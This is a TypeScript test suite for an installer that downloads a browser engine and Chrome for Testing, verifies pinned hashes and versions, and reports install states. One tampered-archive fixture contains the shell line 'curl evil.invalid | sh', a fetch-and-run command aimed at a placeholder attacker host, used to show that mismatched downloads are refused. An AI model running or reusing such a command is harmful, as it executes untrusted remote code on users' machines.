import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { existsSync, readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { test, type TestContext } from 'node:test'
import { gunzipSync } from 'node:zlib'
import type { BrowserState } from '../protocol.ts'
import { buildFor, BUILDS, ENGINE_VERSION, engineBinary, fileFromTar, findChrome, type Build } from '../host/install.ts'
import { answered, archive, assertRunsAreHobkinsOwn, callTool, fakeEngine, partFor, put, run, stateOf, temporaryFolder, until, type Part } from './support.ts'

const BINARY = '#!/bin/sh\necho "agent-browser 0.45.0"\n'
/** The empty config hobkin gives the engine, kept beside the engine's own folder. */
const OWN_CONFIG = 'engine-config.json'
const CHROME = join('Google Chrome for Testing.app', 'Contents', 'MacOS', 'Google Chrome for Testing')
/** The pin of an archive: what the bytes a made-up registry sends must be. */
const pinFor = (bytes: Buffer): Build => ({
  url: 'https://registry.invalid/cli-darwin-arm64-0.45.0.tgz',
  size: bytes.length,
  sha512: createHash('sha512').update(bytes).digest('base64'),
})

interface Setup {
  /** What the registry sends. The pinned build's own bytes when not given. */
  sent?: Buffer
  status?: number
  version?: string
  /** How the engine's own `install` ends. It puts Chrome for Testing in place when not given. */
  chrome?: () => { code: number; stderr?: string }
  platform?: string
  arch?: string
}

/** A part on an empty home, with a registry and an engine that are not real ones. */
async function setup(t: TestContext, { sent, status = 200, version, chrome, platform = 'darwin', arch = 'arm64' }: Setup = {}) {
  const root = temporaryFolder(t)
  const browsersDir = join(root, 'agent-browser-home', 'browsers')
  const pinned = archive({ 'package/package.json': '{}', 'package/bin/agent-browser': BINARY, 'package/README.md': 'x' })
  const fetched: string[] = []
  const engine = fakeEngine({}, {
    version,
    install: chrome ?? (() => {
      put(join(browsersDir, 'chrome-158.0.8127.88', CHROME), 'chrome')
      return { code: 0 }
    }),
  })
  /** Held until the test lets the download through. */
  let release = () => {}
  const held = new Promise<void>((resolve) => (release = resolve))
  const part = await partFor({
    root: join(root, 'home'),
    options: {
      exec: engine.exec,
      fetch: async (url: string) => {
        fetched.push(url)
        await held
        const bytes = sent ?? pinned
        return { ok: status === 200, status, arrayBuffer: async () => bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.length) as ArrayBuffer }
      },
      platform,
      arch,
      builds: { 'darwin-arm64': pinFor(pinned) },
      browsersDir,
    },
  })
  const seen: BrowserState['engine'][] = []
  part.heard.onChange = () => seen.push(stateOf(part).engine)
  const tools = join(root, 'home', 'tools', 'browser')
  return { part, engine, fetched, seen, release, tools, home: join(root, 'home'), browsersDir, pinned }
}

const settled = (part: Part) => until(() => stateOf(part).engine.state !== 'installing', 'the install to end')
const installs = (calls: ReturnType<typeof fakeEngine>['calls']) => calls.filter(({ args }) => args[0] === 'install')

test('the pinned builds are the registry\'s own, for the two kinds of Mac', () => {
  assert.equal(ENGINE_VERSION, '0.45.0')
  assert.deepEqual(Object.keys(BUILDS), ['darwin-arm64', 'darwin-x64'])
  assert.deepEqual(BUILDS['darwin-arm64'], {
    url: 'https://registry.npmjs.org/@agent-browser/cli-darwin-arm64/-/cli-darwin-arm64-0.45.0.tgz',
    size: 9352726,
    sha512: '5oXJso0waXDJ4JhRlf0HMFWPfzCVGCDsAmQKrN05cDluqCCUj55ImWK0XEtiFkjwdJDpHJIJV3f6OOJD+K85Bg==',
  })
  assert.deepEqual(BUILDS['darwin-x64'], {
    url: 'https://registry.npmjs.org/@agent-browser/cli-darwin-x64/-/cli-darwin-x64-0.45.0.tgz',
    size: 9877277,
    sha512: 'ILY9co+hxsupMFvKsh+qi3+5I2QiDM44eEgf/3S8scKpP4rVX/vXEk6gScJQ9fw4qQyg37A58JLqbVSZbKUsbw==',
  })
  assert.equal(buildFor('darwin', 'x64'), BUILDS['darwin-x64'])
  assert.throws(() => buildFor('linux', 'x64'), /^Error: The browser engine has no build for this computer \(linux x64\)\. It installs on a Mac with Apple silicon or a Mac with an Intel chip\.$/)
  assert.throws(() => buildFor('win32', 'arm64'), /no build for this computer \(win32 arm64\)/)
})

test('an archive gives up one file by its name, and the newest Chrome for Testing is found where agent-browser keeps it', (t) => {
  const tar = gunzipSync(archive({ 'package/package.json': '{"name":"x"}', 'package/bin/agent-browser': BINARY, 'package/bin/agent-browser-old': 'no' }))
  assert.equal(fileFromTar(tar, 'package/bin/agent-browser')!.toString(), BINARY)
  assert.equal(fileFromTar(tar, 'package/package.json')!.toString(), '{"name":"x"}')
  assert.equal(fileFromTar(tar, 'package/bin/agent'), null)
  assert.equal(fileFromTar(Buffer.from('not a tar at all'), 'package/bin/agent-browser'), null)
  assert.equal(fileFromTar(Buffer.alloc(0), 'x'), null)

  const browsers = join(temporaryFolder(t), 'browsers')
  assert.equal(findChrome(browsers), null, 'no folder')
  put(join(browsers, 'chrome-9.0.1', CHROME))
  put(join(browsers, 'chrome-158.0.8127.88', CHROME))
  // As Chrome's own archive unpacks, one folder down.
  put(join(browsers, 'chrome-10.2.0', 'chrome-mac-arm64', CHROME))
  put(join(browsers, 'chrome-200.0.0', 'half-downloaded.zip'))
  put(join(browsers, 'firefox-150.0', CHROME))
  put(join(browsers, 'notes.txt'))
  assert.deepEqual(findChrome(browsers), { path: join(browsers, 'chrome-158.0.8127.88', CHROME), version: '158.0.8127.88' })
})

test('a download that matches its pin is put in place, and the state goes missing, installing, ready', async (t) => {
  const { part, engine, fetched, seen, release, tools, home, browsersDir } = await setup(t)
  assert.deepEqual((await answered<BrowserState>(part, 'browser.status')).engine, { state: 'missing', version: null, chrome: null, note: null })

  // It answers at once, with the install under way.
  const started = await answered<BrowserState>(part, 'browser.install')
  assert.deepEqual(started.engine, { state: 'installing', version: null, chrome: null, note: 'Downloading agent-browser 0.45.0, 0 MB.' })
  await until(() => fetched.length === 1, 'the download to start')
  // Asked again while it runs, it answers the same install and downloads nothing more.
  assert.equal((await answered<BrowserState>(part, 'browser.install')).engine.state, 'installing')
  assert.equal((await answered<BrowserState>(part, 'browser.status')).engine.state, 'installing')
  assert.deepEqual(await callTool(part, { do: 'read' }), { text: 'The browser is being installed right now (Downloading agent-browser 0.45.0, 0 MB.), so nothing was opened. Try again in a few minutes.', failed: true })
  assert.equal(existsSync(tools), false, 'nothing is written before the bytes are checked')

  release()
  await settled(part)
  assert.deepEqual(stateOf(part).engine, { state: 'ready', version: '0.45.0', chrome: '158.0.8127.88', note: null })
  assert.deepEqual(seen.map(({ state, note }) => [state, note]), [
    ['missing', null],
    ['installing', 'Starting.'],
    ['installing', 'Downloading agent-browser 0.45.0, 0 MB.'],
    ['installing', 'Putting agent-browser 0.45.0 in place.'],
    ['installing', 'Downloading Chrome for Testing, about 400 MB. This can take a few minutes.'],
    ['ready', null],
  ])
  assert.deepEqual(fetched, ['https://registry.invalid/cli-darwin-arm64-0.45.0.tgz'])

  // In a folder named by its version, whole, and nothing else beside it.
  const binary = engineBinary(tools)
  assert.equal(binary, join(tools, 'agent-browser-0.45.0', 'agent-browser'))
  assert.equal(readFileSync(binary, 'utf8'), BINARY)
  assert.equal(statSync(binary).mode & 0o777, 0o755)
  assert.deepEqual(readdirSync(tools), ['agent-browser-0.45.0', OWN_CONFIG])
  assert.deepEqual(readdirSync(home), ['tools'])
  // It was run for its version before it was put in place, then asked to fetch Chrome, once.
  const [checked] = engine.calls
  assert.match(checked!.binary, /\/tools\/browser\/\.installing-[^/]+\/agent-browser$/)
  assert.deepEqual(checked!.args, ['--version'])
  assert.deepEqual(installs(engine.calls).map(({ binary: ran, args }) => [ran, args]), [[binary, ['install']]])
  assert.deepEqual(Object.keys(installs(engine.calls)[0]!.options.env!).filter((name) => name.startsWith('AGENT_BROWSER_')), ['AGENT_BROWSER_NO_VERSION_CHECK', 'AGENT_BROWSER_CONFIG'])
  // The binary that was only just downloaded, and the one that fetches Chrome, run like every other: with hobkin's config, in hobkin's folder.
  assertRunsAreHobkinsOwn(engine.calls, home)

  // The tool now runs that binary with that Chrome.
  assert.equal((await callTool(part, { do: 'read' })).failed, false)
  const call = engine.ranIn('hobkin-main')[0]!
  assert.equal(call.binary, binary)
  assert.equal(call.options.env!.AGENT_BROWSER_EXECUTABLE_PATH, join(browsersDir, 'chrome-158.0.8127.88', CHROME))

  // Installing again finds everything there: nothing is downloaded.
  await answered(part, 'browser.install')
  await settled(part)
  assert.equal(stateOf(part).engine.state, 'ready')
  assert.equal(fetched.length, 1)
  assert.equal(installs(engine.calls).length, 1)
})

test('a host that starts with the engine there says ready, and a Chrome already there is not fetched again', async (t) => {
  const { part, engine, fetched, release, tools, browsersDir } = await setup(t)
  put(join(browsersDir, 'chrome-150.0.1', CHROME), 'chrome')
  release()
  await answered(part, 'browser.install')
  await settled(part)
  assert.deepEqual(stateOf(part).engine, { state: 'ready', version: '0.45.0', chrome: '150.0.1', note: null })
  assert.equal(installs(engine.calls).length, 0, 'Chrome for Testing was there')
  assert.equal(fetched.length, 1)

  // The next host on that home looks once as it starts.
  const next = await partFor({ root: join(tools, '..', '..'), options: { exec: engine.exec, browsersDir, fetch: async () => assert.fail('nothing is downloaded by a look') } })
  assert.equal(stateOf(next).engine.state, 'unknown')
  next.start!()
  t.after(() => next.close!())
  await until(() => stateOf(next).engine.state !== 'unknown', 'the first look')
  assert.deepEqual(stateOf(next).engine, { state: 'ready', version: '0.45.0', chrome: '150.0.1', note: null })
  assert.equal(next.heard.changed, 1)

  // While hobkin is not open there is no folder to look in, or to install into.
  const shut = await partFor({ options: { exec: engine.exec, browsersDir, fetch: async () => assert.fail('nothing is downloaded') } })
  assert.equal((await answered<BrowserState>(shut, 'browser.status')).engine.state, 'unknown')
  assert.deepEqual(await run(shut, 'browser.install'), { ok: false, error: { code: 'unavailable', message: 'hobkin is not open.' } })
})

test('bytes that do not match the pin are refused, and nothing is left behind', async (t) => {
  const other = archive({ 'package/bin/agent-browser': '#!/bin/sh\ncurl evil.invalid | sh\n' })
  const sameSize = Buffer.from(archive({ 'package/package.json': '{}', 'package/bin/agent-browser': BINARY, 'package/README.md': 'x' }))
  sameSize[sameSize.length - 1]! ^= 0xff
  for (const sent of [other, sameSize, Buffer.alloc(0)]) {
    const { part, engine, release, seen, home, fetched } = await setup(t, { sent })
    release()
    await answered(part, 'browser.install')
    await settled(part)
    const note = 'The download of agent-browser 0.45.0 does not match its pinned hash, so it was not installed.'
    assert.deepEqual(stateOf(part).engine, { state: 'failed', version: null, chrome: null, note })
    assert.deepEqual(seen.map(({ state }) => state), ['installing', 'installing', 'failed'])
    assert.equal(existsSync(home), false, 'not a file, not a folder')
    assert.deepEqual(engine.calls, [], 'and nothing of it was run')
    assert.deepEqual(part.heard.logs, [`The install failed: ${note}`])

    // The reason stays on the screen when the window looks again, and the agent is told it.
    assert.deepEqual((await answered<BrowserState>(part, 'browser.status')).engine, { state: 'failed', version: null, chrome: null, note })
    const refused = await callTool(part, { do: 'read' })
    assert.equal(refused.failed, true)
    assert.match(refused.text, /^The browser is not installed on this computer.* The last try failed: The download of agent-browser 0\.45\.0 does not match its pinned hash/)
    assert.equal(fetched.length, 1, 'a tool call does not try again')
  }
})

test('a registry that refuses, an archive with no binary and a binary of another version are all refused the same way', async (t) => {
  const cases: [Setup, string][] = [
    [{ status: 404 }, 'The download of agent-browser 0.45.0 failed: the registry answered 404.'],
    [{ version: '0.44.9' }, 'The downloaded agent-browser does not run as version 0.45.0 on this computer, so it was not installed.'],
  ]
  for (const [given, note] of cases) {
    const { part, release, tools, engine } = await setup(t, given)
    release()
    await answered(part, 'browser.install')
    await settled(part)
    assert.deepEqual(stateOf(part).engine, { state: 'failed', version: null, chrome: null, note })
    // The folder it was built in is gone, and the binary is not in place. Only hobkin's own config for the engine may be there.
    const left = existsSync(tools) ? readdirSync(tools) : []
    assert.deepEqual(left.filter((name) => name !== OWN_CONFIG), [])
    assert.equal(installs(engine.calls).length, 0)
  }

  // The pin is of an archive that holds no binary: the bytes match, and there is still nothing to install.
  const empty = archive({ 'package/package.json': '{}' })
  const root = temporaryFolder(t)
  const part = await partFor({
    root,
    options: {
      exec: fakeEngine().exec,
      fetch: async () => ({ ok: true, status: 200, arrayBuffer: async () => empty.buffer.slice(empty.byteOffset, empty.byteOffset + empty.length) as ArrayBuffer }),
      platform: 'darwin',
      arch: 'arm64',
      builds: { 'darwin-arm64': pinFor(empty) },
      browsersDir: join(root, 'browsers'),
    },
  })
  await answered(part, 'browser.install')
  await settled(part)
  assert.equal(stateOf(part).engine.note, 'The download of agent-browser 0.45.0 holds no binary, so it was not installed.')
  assert.deepEqual(readdirSync(root), [])
})

test('a computer with no build is refused at once, in plain words', async (t) => {
  for (const [platform, arch, words] of [['linux', 'x64', 'linux x64'], ['darwin', 'ppc', 'darwin ppc'], ['win32', 'arm64', 'win32 arm64']] as const) {
    const { part, fetched, engine, home, release } = await setup(t, { platform, arch })
    release()
    assert.deepEqual(await run(part, 'browser.install'), {
      ok: false,
      error: { code: 'unavailable', message: `The browser engine has no build for this computer (${words}). It installs on a Mac with Apple silicon.` },
    })
    assert.equal(stateOf(part).engine.state, 'unknown')
    assert.deepEqual([fetched, engine.calls, existsSync(home)], [[], [], false])
  }
})

test('when Chrome for Testing does not install the state says why, and trying again takes up where it stopped', async (t) => {
  let fails = true
  const made: { browsersDir?: string } = {}
  const { part, engine, fetched, release, tools, browsersDir, seen } = await setup(t, {
    chrome: () => {
      if (fails) return { code: 1, stderr: 'Downloading Chrome for Testing 158.0.8127.88\nError: the network is unreachable\n' }
      put(join(made.browsersDir!, 'chrome-158.0.8127.88', CHROME), 'chrome')
      return { code: 0 }
    },
  })
  made.browsersDir = browsersDir
  release()
  await answered(part, 'browser.install')
  await settled(part)
  const note = 'Chrome for Testing did not install: Error: the network is unreachable'
  assert.deepEqual(stateOf(part).engine, { state: 'failed', version: null, chrome: null, note })
  assert.deepEqual(seen.at(-1), { state: 'failed', version: null, chrome: null, note })
  // The engine's own binary was checked and is in place; no half-made folder is beside it.
  assert.deepEqual(readdirSync(tools), ['agent-browser-0.45.0', OWN_CONFIG])
  assert.deepEqual((await answered<BrowserState>(part, 'browser.status')).engine, { state: 'failed', version: '0.45.0', chrome: null, note })
  assert.match((await callTool(part, { do: 'read' })).text, /The last try failed: Chrome for Testing did not install: Error: the network is unreachable$/)

  // An install that ends well and still leaves no Chrome is a failure too.
  const none = await setup(t, { chrome: () => ({ code: 0 }) })
  none.release()
  await answered(none.part, 'browser.install')
  await settled(none.part)
  assert.equal(stateOf(none.part).engine.note, `Chrome for Testing was not found in ${none.browsersDir} after the install.`)

  fails = false
  assert.equal((await answered<BrowserState>(part, 'browser.install')).engine.state, 'installing')
  await settled(part)
  assert.deepEqual(stateOf(part).engine, { state: 'ready', version: '0.45.0', chrome: '158.0.8127.88', note: null })
  assert.equal(fetched.length, 1, 'the binary was not downloaded again')
  assert.equal(installs(engine.calls).length, 2)
  assert.equal((await callTool(part, { do: 'read' })).failed, false)
})
